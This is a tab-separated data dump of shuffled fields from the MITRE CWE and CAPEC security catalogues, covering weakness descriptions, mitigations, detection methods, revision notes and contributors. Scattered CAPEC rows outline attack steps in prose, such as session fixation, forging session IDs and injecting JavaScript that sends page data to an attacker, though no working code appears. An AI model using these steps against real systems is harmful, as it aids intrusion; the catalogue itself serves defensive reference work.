12584	28	CWE Content Team
7720	39	2011-06-01
10392	35	Cigital
22183	23	The software does not handle or incorrectly handles when a particular element is not the expected type, e.g. it expects a digit (0-9) but is provided with a letter (A-Z).
22577	45	Variant
8302	103	Primary
24894	62	updated Potential_Mitigations, Time_of_Introduction
23718	31	699
20817	43	Simple
20567	100	The MITRE Corporation
19652	56	ChildOf
10338	28	CWE Content Team
7221	102	PeerOf
7561	55	CAPEC Content Team
10889	21	CWE Content Team
13349	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....//' (doubled dot dot slash) sequences that can resolve to a location that is outside of that directory.
22057	89	Standard
19740	28	CWE Content Team
23209	28	CWE Content Team
23909	66	Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet
17464	73	An attacker makes many anonymous connections and records the session IDs.
21858	32	Annual Computer Security Applications Conference (ACSAC)
12859	28	CWE Content Team
22029	28	CWE Content Team
15639	62	updated Applicable_Platforms
8182	91	Implementation
11401	62	updated Relationships
16869	28	CWE Content Team
15745	97	Malicious Software Implanted
18905	26	Implementation
20990	73	Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.
8630	26	Implementation
16457	103	Primary
10920	91	Implementation
5829	39	2009-12-28
6492	35	MITRE
20463	81	Confidentiality
12128	31	1000
18655	103	Primary
18993	77	Manual Static Analysis
15143	59	Updated Attacker_Skills_or_Knowledge_Required
10845	63	Bypass Protection Mechanism
23988	28	Sean Eidemiller
14814	104	842
9691	90	Language-Independent
11091	46	When leveraging external functionality, such as an API, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.
24907	91	Testing
22223	28	CWE Content Team
15936	39	2008-09-08
6726	43	Simple
12580	50	An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.
24250	102	ChildOf
9428	35	MITRE
7827	35	MITRE
21002	39	2014-07-30
7375	28	Eric Dalci
16751	81	Availability
9230	56	ChildOf
5734	103	Primary
23384	72	The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.
25157	39	2011-06-01
18893	53	The MITRE Corporation
7249	35	MITRE
9979	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
15967	103	Primary
18799	79	Access Control
17947	91	Installation
17658	53	The MITRE Corporation
17852	35	MITRE
10305	76	2018-07-31
24217	62	updated References
12047	56	ChildOf
5712	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
9343	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
9942	28	CWE Content Team
14846	39	2011-06-01
18542	28	CWE Content Team
6710	76	2018-07-31
16474	39	2017-11-08
13297	35	MITRE
9759	28	CWE Content Team
22973	56	ChildOf
9888	45	Variant
6654	31	1000
9715	102	ChildOf
22474	62	updated Relationships, Taxonomy_Mappings
8418	43	Simple
11938	33	OWASP
14695	46	This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.
8710	62	updated References, Relationships
22893	28	CWE Content Team
18394	35	MITRE
17503	62	updated Other_Notes
20476	73	Use a proxy tool to record results of manual input of XSS probes in known URLs.
25235	31	1003
22529	104	582
9400	23	The software does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.
18267	100	The MITRE Corporation
18538	28	CWE Content Team
20660	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24698	28	CWE Content Team
24574	31	1000
22014	23	An adversary modifies the design of a technology, product, or component to acheive a negative impact once the system is deployed. In this type of attack, the goal of the adversary is to modify the design of the system, prior to development starting, in such a way that the negative impact can be leveraged when the system is later deployed. Design alteration attacks differ from development alteration attacks in that design alteration attacks take place prior to development and which then may or may not be developed by the adverary. Design alteration attacks include modifying system designs to degrade system performance, cause unexpected states or errors, and general design changes that may lead to additional vulnerabilities. These attacks generally require insider access to modify design documents, but they may also be spoofed via web communications. The product is then developed and delivered to the user where the negative impact can be leveraged at a later time.
24012	33	Carl A. Gunter
9537	56	ChildOf
9981	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
20500	47	Read Data
22183	45	Base
24263	24	MITRE
10436	76	2017-08-04
12001	39	2019-06-20
18140	39	2017-05-03
23076	30	Andre Yee
8458	43	Simple
6809	78	Very High
11901	33	Robert Graham
9891	70	Attacking DSA Under a Repeated Bits Assumption
23090	51	2017-02-14
14384	47	Gain Privileges
10495	91	Architecture and Design
9539	28	CWE Content Team
15692	45	Variant
10193	61	Draft
6126	63	Modify Application Data
23682	69	Incomplete
25437	42	Design signal handlers to only set flags rather than perform complex functionality.
19982	23	An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash.
9177	39	2014-07-30
18018	23	A source code file has too many lines of      code.
10952	39	2019-01-03
13958	63	Bypass Protection Mechanism
8567	31	699
15177	39	2012-10-30
20675	39	2012-05-11
7142	86	http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf
24917	30	Collin Jackson
24124	90	C++
10661	62	updated Demonstrative_Examples, Description, References
23757	28	CWE Content Team
15615	43	Simple
19876	45	Base
19246	76	2019-04-04
17306	62	updated Relationships
22131	39	2012-10-30
10925	63	DoS: Crash, Exit, or Restart
8523	39	2008-07-01
18445	44	SOAR Partial
19018	40	Some level of access to modify the target schema.
23473	28	CWE Content Team
11760	28	CWE Content Team
20760	91	Architecture and Design
19952	88	Missing Documentation for Design
10960	103	Primary
8168	28	CWE Content Team
14979	31	1000
17888	63	Modify Application Data
21626	39	2012-10-30
24567	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
13312	46	A null byte (NUL character) can have different meanings across representations or languages. For example, it is a string terminator in standard C libraries, but Perl and PHP strings do not treat it as a terminator. When two representations are crossed - such as when Perl or PHP invokes underlying C functionality - this can produce an interaction error with unexpected results. Similar issues have been reported for ASP. Other interpreters written in C might also be affected.             The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename. It can play a role in regular expression processing in PHP.
22889	35	Cigital
17402	39	2008-07-01
16821	23	While it is executing, the software sets the permissions of an object in a way that violates the intended permissions that have been specified by the user.
22470	39	2009-01-12
16469	35	MITRE
10284	42	Where possible, avoid building a single string that contains the command and its arguments.  Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command.  For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments.  In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.
24980	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
6504	39	2008-07-01
11533	62	updated Common_Consequences
5642	39	2008-09-08
17616	35	Veracode
14911	28	CWE Content Team
6671	59	Updated Related_Attack_Patterns
10046	40	Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.
16323	73	Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.
24936	56	ChildOf
8813	74	2
21092	61	Stable
22660	45	Variant
11672	91	Build and Compilation
9309	23	The application contains debugging code that can expose sensitive information to untrusted parties.
5800	50	Ensure virtualization software is current and up-to-date.
15583	59	Updated Description, Example_Instances, Execution_Flow, References, Related_Attack_Patterns, Related_Weaknesses, Skills_Required
6942	35	MITRE
18198	81	Availability
23488	35	Cigital
18625	66	Spinner: Semi-Automatic Detection of Pinning without Hostname Verification
23677	35	MITRE
6936	40	An attacker and the victim are both using the same WiFi network.
24348	39	2008-07-01
16439	95	The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.
19261	59	Updated Description Summary, Examples-Instances, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
21579	28	CWE Content Team
24274	35	MITRE
15831	62	updated Potential_Mitigations, Time_of_Introduction
21126	88	External Control of File Name or Path
23875	39	2014-07-30
23723	27	The attacker must convince the victim to click their crafted link.
25428	39	2008-07-01
20282	79	Accountability
17335	59	Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
18492	63	Varies by Context
7878	63	Quality Degradation
23619	28	CWE Content Team
19538	90	Language-Independent
20977	28	CWE Content Team
9733	103	Primary
8973	26	Implementation
22817	62	updated Time_of_Introduction
14577	63	Read Files or Directories
25181	28	CWE Content Team
19987	31	699
18408	31	699
7456	39	2011-06-01
19118	103	Primary
20045	40	None
25090	69	Incomplete
12169	100	The MITRE Corporation
13745	21	PLOVER
11600	42	Handle all possible situations (e.g. error condition).
13561	28	CWE Content Team
24375	50	Identify programs that may be used to acquire security tool information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
11776	103	Primary
19912	53	The MITRE Corporation
20632	28	CWE Content Team
11074	47	Read Data
13318	100	The MITRE Corporation
22048	79	Confidentiality
15800	26	Implementation
12392	69	Draft
24246	59	Updated Description Summary
17006	100	The MITRE Corporation
22503	56	ChildOf
6854	31	699
19499	28	CWE Content Team
16145	28	CWE Content Team
24454	89	Standard
24764	91	System Configuration
10648	62	updated Common_Consequences
24802	96	2008-01-30
14534	39	2011-09-13
12991	35	Cigital
12367	42	Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.
21742	79	Integrity
18551	35	MITRE
12162	35	MITRE
17672	63	Varies by Context
20080	62	updated Common_Consequences
20591	63	Modify Memory
12398	45	Variant
6036	62	updated Description, Name
12717	96	2018-07-02
25277	59	Updated Related_Weaknesses
12526	100	The MITRE Corporation
11578	39	2010-06-21
19126	60	15
9498	103	Primary
23084	39	2017-05-03
17794	62	updated Observed_Examples, Relationships
15879	28	CWE Content Team
21825	81	Confidentiality
23737	53	The MITRE Corporation
13948	89	Detailed
8349	59	Updated Related_Attack_Patterns
23924	28	CWE Content Team
16386	81	Integrity
18216	88	Initialization with Hard-Coded Network Resource Configuration Data
12895	97	Fuzzing for garnering other adjacent user/sensitive data
23398	39	2010-06-21
18648	28	CWE Content Team
7281	62	updated Relationships, Taxonomy_Mappings
15991	35	MITRE
18631	35	MITRE
14569	21	CWE Content Team
9447	28	CWE Content Team
20380	35	MITRE
7068	35	MITRE
10084	69	Draft
19619	28	CWE Content Team
13718	62	updated Potential_Mitigations
8837	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
13051	22	11
13016	35	MITRE
13136	81	Integrity
8965	28	CWE Content Team
6872	23	The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.
6640	62	updated Relationships
10386	35	MITRE
15146	73	On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.
6371	81	Other
9907	28	CWE Content Team
20571	103	Primary
16559	28	CWE Content Team
19762	42	Repeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout.
9328	56	PeerOf
18187	76	2017-08-04
14767	62	updated Common_Consequences, Other_Notes, Relationships
13976	90	Java
11447	43	Simple
24334	102	ChildOf
21119	90	Language-Independent
20690	39	2010-06-21
23415	35	MITRE
16095	26	Architecture and Design
8131	42	Perform functionality testing before deploying the application.
15705	39	2011-06-01
8313	102	ChildOf
7845	69	Incomplete
12303	62	updated Related_Attack_Patterns
17081	35	MITRE
25373	31	699
11485	95	[Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.
23085	39	2019-06-20
19862	100	The MITRE Corporation
10207	39	2017-11-08
5942	62	updated Relationships, Taxonomy_Mappings
15101	91	Implementation
12477	39	2011-06-01
21531	39	2014-07-30
12215	63	Unexpected State
11771	35	MITRE
18851	77	Architecture or Design Review
9801	62	updated Relationships, Taxonomy_Mappings
16052	35	MITRE
6473	81	Non-Repudiation
6028	31	1000
8465	81	Confidentiality
17129	62	updated References, Relationships
11666	67	High
16032	28	CWE Content Team
15679	103	Primary
22079	51	2014-06-23
21663	31	699
16852	35	MITRE
6654	103	Primary
16463	35	MITRE
25366	102	ChildOf
11897	54	High
22265	81	Confidentiality
12045	73	Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file.
12248	63	Gain Privileges or Assume Identity
9482	76	2015-12-07
25297	62	updated Potential_Mitigations, Time_of_Introduction
16188	76	2017-05-01
23968	57	Indirect
17283	28	CWE Content Team
13158	35	MITRE
9936	44	Moderate
22266	100	The MITRE Corporation
8723	62	updated Common_Consequences
7611	35	MITRE
18562	35	MITRE
13071	104	27
8343	39	2018-03-27
19313	43	Simple
23349	21	Anonymous Tool Vendor (under NDA)
24705	39	2009-12-28
15001	100	The MITRE Corporation
16383	35	MITRE
10515	62	updated Taxonomy_Mappings
24934	28	CWE Content Team
14365	89	Standard
14543	62	updated Common_Consequences
20337	39	2012-05-11
15173	81	Confidentiality
12598	40	Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.Recipient is using signature verification software that contains a parsing vulnerability, or allows control characters in the signer identity field, such that a signature is mistakenly displayed as valid and from a known or authoritative signer.
17243	39	2011-06-01
22008	79	Access Control
17450	28	Eric Dalci
9279	62	updated Potential_Mitigations, Time_of_Introduction
16753	50	Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.
5726	39	2014-07-30
21462	100	The MITRE Corporation
9500	39	2012-10-30
8402	39	2008-11-24
17756	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.The target OS must support the TCP timestamp option in order to obtain a fingerprint.
18934	60	26
16950	56	ChildOf
6209	62	updated Time_of_Introduction
7205	31	700
24427	50	Use a language or compiler that performs automatic bounds checking.
6419	54	High
24330	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required
21098	63	Gain Privileges or Assume Identity
18003	70	Social Engineering: The Art of Human Hacking
11216	26	Implementation
23082	62	updated Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
21785	39	2010-06-21
20233	39	2012-05-11
23100	62	updated Common_Consequences
10792	39	2008-07-01
19602	99	SANS Software Security Institute
12288	54	High
24116	63	Read Application Data
13221	100	The MITRE Corporation
12407	35	KDM Analytics
22684	79	Authorization
19251	101	CAPEC Content Team
16879	62	updated Common_Consequences, Relationships
19285	62	updated Relationships
16227	69	Draft
19102	31	1000
7030	59	Updated Related_Weaknesses
7868	56	ChildOf
9051	35	MITRE
5843	69	Draft
12503	31	1000
9454	89	Standard
11915	62	updated Related_Attack_Patterns
16000	55	CAPEC Content Team
6708	56	ChildOf
20359	62	updated Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
23494	90	Language-Independent
17410	28	CWE Content Team
7774	62	updated Description, Relationships, Taxonomy_Mappings, Type
10133	39	2013-07-17
6313	35	MITRE
19723	90	Language-Independent
8637	90	Language-Independent
19693	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Use libraries or frameworks that make it easier to handle numbers without unexpected consequences, or buffer allocation routines that automatically track buffer size.                   Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]
23605	28	CWE Content Team
20369	56	ChildOf
21264	26	Architecture and Design
18923	21	PLOVER
8983	28	CWE Content Team
8863	44	High
5653	35	MITRE
8965	39	2008-09-08
10927	39	2010-09-27
25004	57	Resultant
21873	51	2014-06-23
5812	47	Other
21863	62	updated Description, Name
19923	78	High
9548	35	MITRE
19168	79	Confidentiality
13317	81	Integrity
23793	90	Ruby
19104	31	699
18188	79	Authorization
6133	62	updated Potential_Mitigations
15284	62	updated References
7796	79	Authorization
16458	26	Implementation
17277	28	CWE Content Team
18402	35	MITRE
9599	25	Low
24233	47	Modify Data
10321	73	Research types of SQL queries and determine which ones could be used at various places in an application.
6853	90	C
9478	102	ChildOf
15931	28	CWE Content Team
19137	91	Implementation
12868	28	Eric Dalci
7459	31	1000
15027	50	Employ robust cybersecurity training for all employees.
8691	47	Read Data
13279	28	CWE Content Team
22178	62	updated Applicable_Platforms, Likelihood_of_Exploit, References
9101	76	2019-09-30
13992	89	Standard
24454	23	An adversary uses stolen credentials (e.g., userid and password) to access systems managed under the same credential framework on a local network. Often, users are allowed to login to connected machines using the same password. Discovery of the password on one machine allows for lateral movement to those machines.
20107	35	MITRE
13993	47	Read Data
11666	104	287
23203	28	CWE Content Team
16690	53	The MITRE Corporation
14268	95	[Probing] The attacker probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.
6244	86	https://www.owasp.org/index.php/Clickjacking
23794	50	Leverage anti-virus products to detect and quarantine software with known virus.
17147	104	378
20356	39	2012-10-30
22289	89	Detailed
17868	45	Base
9085	79	Integrity
10448	39	2012-05-11
19518	28	CWE Content Team
22375	62	updated Relationships
18229	81	Integrity
8854	81	Other
12103	76	2019-09-30
24249	62	updated Potential_Mitigations
17945	26	Implementation
6209	28	Eric Dalci
20697	72	Data may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure.
22112	23	An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.
17145	104	57
16084	62	updated Time_of_Introduction
19852	35	MITRE
6733	100	The MITRE Corporation
6446	96	2018-07-02
7298	55	CAPEC Content Team
21925	23	The product uses a blacklist-based protection mechanism to defend against XSS attacks, but the blacklist is incomplete, allowing XSS variants to succeed.
24803	39	2008-09-08
16681	39	2008-09-08
16687	35	MITRE
19935	45	Class
8893	69	Incomplete
10916	62	updated Relationships
10698	35	MITRE
19645	28	CWE Content Team
5648	62	updated Common_Consequences
25013	103	Primary
16204	35	MITRE
25174	74	3
8942	54	High
10865	63	Other
11151	88	Path Equivalence: '/multiple/trailing/slash//'
19224	39	2011-06-01
24456	35	Cigital
23092	91	Architecture and Design
8243	77	Automated Static Analysis - Source Code
18901	39	2008-11-24
9597	47	Execute Unauthorized Commands
9200	40	An authoritative or reputable signer is storing their private signature key with insufficient protection.
21396	79	Confidentiality
21657	104	119
24508	35	MITRE
12279	62	updated Relationships, Taxonomy_Mappings
12542	91	Implementation
15322	71	2017
10419	28	CWE Content Team
14445	23	An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.
8459	33	mercy
23970	88	Incomplete Filtering of One or More Instances of Special Elements
23320	62	updated Time_of_Introduction
20365	62	updated Relationships
17587	25	Low
10332	72	An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource.
15684	74	1
21565	62	updated References, Relationships
13783	73	The attacker disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.
18192	28	CWE Content Team
11518	35	MITRE
22157	88	Replicating Malicious Code (Virus or Worm)
13107	61	Stable
24927	44	High
15858	39	2010-02-16
15245	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
24911	69	Draft
17176	40	The target must be relying on valid GPS signal to perform critical operations.
15121	104	383
21819	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
7043	62	updated Other_Notes, Weakness_Ordinalities
12238	62	updated Time_of_Introduction
18836	81	Other
11618	103	Primary
8674	39	2008-08-01
12104	63	Modify Application Data
18285	103	Primary
23220	50	Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.
20926	26	Implementation
21289	28	CWE Content Team
20758	35	Cigital
10830	28	CWE Content Team
7539	35	MITRE
17383	23	An adversary disables the network route between two targets. The goal is to completely sever the communications channel between two entities. This is often the result of a major error or the use of an "Internet kill switch" by those in control of critical infrastructure. This attack pattern differs from most other obstruction patterns by targeting the route itself, as opposed to the data passed over the route.
11808	28	CWE Content Team
6901	39	2014-02-18
14231	62	updated Relationships
13413	28	CWE Content Team
10815	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation
12505	62	updated Potential_Mitigations
10639	39	2011-03-29
17315	69	Draft
13506	91	Architecture and Design
6069	21	PLOVER
12131	103	Primary
13127	56	CanPrecede
23249	67	Medium
19110	62	updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
6661	28	CWE Content Team
17754	89	Detailed
13332	103	Primary
10659	56	ChildOf
23653	26	Architecture and Design
5898	39	2008-07-01
16097	66	Resource exhaustion
24256	40	The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.
20459	78	Very High
11722	21	CWE Content Team
7339	66	Giving SQL Injection the Respect it Deserves
16323	73	Use XML files to inject input.
6169	56	ChildOf
7468	39	2009-12-28
13641	28	CWE Content Team
15447	97	Install Rootkit
15964	63	Execute Unauthorized Code or Commands
12837	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Solutions_and_Mitigations
22289	27	Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.
23903	35	MITRE
16828	28	CWE Content Team
21953	35	MITRE
6689	35	MITRE
20433	102	ChildOf
15496	100	The MITRE Corporation
9077	39	2009-07-27
21657	23	The software performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.
24455	28	CWE Content Team
16094	25	High
15443	28	Eric Dalci
19675	95	An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.
10153	35	MITRE
22095	89	Detailed
14002	85	387
20490	62	updated Relationships
10154	56	CanPrecede
10782	61	Draft
7319	79	Authorization
10134	35	MITRE
24199	28	CWE Content Team
15088	25	Medium
24872	56	ChildOf
25023	39	2019-01-03
22443	39	2008-07-01
8539	62	updated Demonstrative_Examples
13042	35	Cigital
23644	59	Updated Resources_Required
22179	62	updated Common_Consequences, Description
22465	63	Read Application Data
22196	66	Exploiting Deserialization Vulnerabilities in Java
17831	39	2014-07-30
7993	72	By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536.
21354	28	CWE Content Team
6302	39	2010-02-16
17083	100	The MITRE Corporation
9582	62	updated Relationships
22359	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
17298	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
21630	77	Automated Static Analysis
13843	35	MITRE
23734	39	2019-06-20
12362	63	Reduce Reliability
14785	35	MITRE
20311	62	updated Relationships
6306	80	The attacker needs to have knowledge of LDAP, especially its query syntax.
19076	28	CWE Content Team
6594	81	Confidentiality
10740	28	CWE Content Team
24740	39	2017-11-08
14621	35	MITRE
24115	28	CWE Content Team
12654	74	2
18652	86	http://www.sectheory.com/clickjacking.html
13360	100	The MITRE Corporation
17918	28	CWE Content Team
22588	43	Simple
16507	35	MITRE
25134	28	CWE Content Team
20034	81	Other
19849	81	Integrity
19599	31	1000
23673	62	updated Description, Relationships, Taxonomy_Mappings
23194	42	Invalidate cached privileges, file handles or descriptors, or other access credentials whenever identities, processes, policies, roles, capabilities or permissions change. Perform complete authentication checks before accepting, caching and reusing data, dynamic content and code (scripts). Avoid caching access control decisions as much as possible.
13732	91	Implementation
11710	59	Updated Related_Weaknesses
11520	28	CWE Content Team
16441	35	MITRE
17548	103	Primary
21229	77	Dynamic Analysis with Manual Results Interpretation
10776	39	2012-10-30
22411	28	CWE Content Team
21929	102	ChildOf
12659	73	The attacker manipulates the HTTP request message and adds his forged session IDs in to the requests or cookies.
21783	104	473
21942	39	2018-03-27
15412	35	MITRE
16771	88	Information Exposure Through Shell Error Message
8062	100	The MITRE Corporation
21879	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   To reduce the likelihood of code injection, use stringent whitelists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().
13296	103	Primary
6440	39	2011-09-13
15462	31	1000
14569	24	MITRE
22882	76	2018-07-31
21221	73	Modify structural components of tokens
13420	28	CWE Content Team
17570	39	2009-12-28
12300	96	2018-07-02
18075	28	CWE Content Team
22388	35	MITRE
9064	70	XML and Web Services In The News
6312	35	MITRE
8064	70	Mozilla Firefox Add-ons
25328	62	updated Time_of_Introduction
11079	35	MITRE
19100	62	updated Relationships
13399	100	The MITRE Corporation
11654	42	Do not attempt to process an error or attempt to mask it.
19848	35	MITRE
18699	103	Primary
9860	59	Updated @Abstraction
17792	44	High
8252	93	High
8891	67	Medium
19410	33	Government of the State of California
9215	31	1003
12354	63	Execute Unauthorized Code or Commands
7920	28	CWE Content Team
18144	59	Updated Resources_Required
24045	28	CWE Content Team
11153	104	420
20907	69	Incomplete
24676	81	Confidentiality
22544	62	updated Potential_Mitigations
20132	96	2017-09-26
8164	28	CWE Content Team
20744	62	updated Description, Name
22424	66	Injection-safe templating languages
5620	100	The MITRE Corporation
9838	28	CWE Content Team
7983	39	2011-03-29
19816	35	MITRE
18784	62	updated References, Type
8272	30	J. Postel
13886	35	MITRE
9982	101	CAPEC Content Team
10104	39	2010-04-05
18470	62	updated Potential_Mitigations
9080	39	2012-05-11
24563	39	2012-10-30
6492	28	CWE Content Team
10992	28	CWE Content Team
5701	59	Updated Attack_Phases, Related_Attack_Patterns
6129	56	ChildOf
18655	56	ChildOf
12132	62	updated Common_Consequences
11443	73	Attempt to write to other user TTYs. This approach could leave a trail or alert a user.
25056	62	updated Common_Consequences
17931	28	CWE Content Team
21560	39	2008-11-24
22371	72	If a released resource is subsequently reused or reallocated, then an attempt to use the original resource might allow access to sensitive data that is associated with a different user or entity.
13695	62	updated Relationships
12008	102	ChildOf
13401	39	2014-07-30
11819	96	2018-07-29
19113	62	updated Potential_Mitigations, Time_of_Introduction
13976	69	Draft
18269	28	CWE Content Team
19182	50	Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.
19152	97	Excavation
14069	91	Architecture and Design
17777	62	updated Common_Consequences
15883	62	updated Modes_of_Introduction, Observed_Examples, Relationships
25261	62	updated Relationships, Taxonomy_Mappings
8091	35	Cigital
9548	28	CWE Content Team
5867	35	MITRE
9086	62	updated Relationships, Other_Notes, Taxonomy_Mappings
9801	39	2008-09-08
8575	40	An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.
16789	89	Detailed
21602	76	2018-07-31
7825	23	An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on over-stimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message. The fundamental difference is that embedded messages have a complete semantic quality, rather than mere imagery, and the mind of the target tends to key off of particular dominant patterns. The remaining information, carefully structured, speaks directly to the subconscious with a subtle, indirect, command. The effect is to produce a pattern of thinking that the attacker has predetermined but is buried within the message and not overtly stated. Structuring a human "buffer overflow" requires precise attention to detail and the use of information in a manner that distracts the conscious mind from the message the subconscious is receiving.
7814	28	CWE Content Team
6461	42	Pass in data which should not be altered as constant or immutable.
6949	101	CAPEC Content Team
20217	35	MITRE
12411	28	CWE Content Team
15286	35	MITRE
12617	30	R. Braden, Ed.
17541	97	TCP Window Scan
15243	33	Seth Fogie
10233	56	ChildOf
6265	79	Availability
9062	74	1
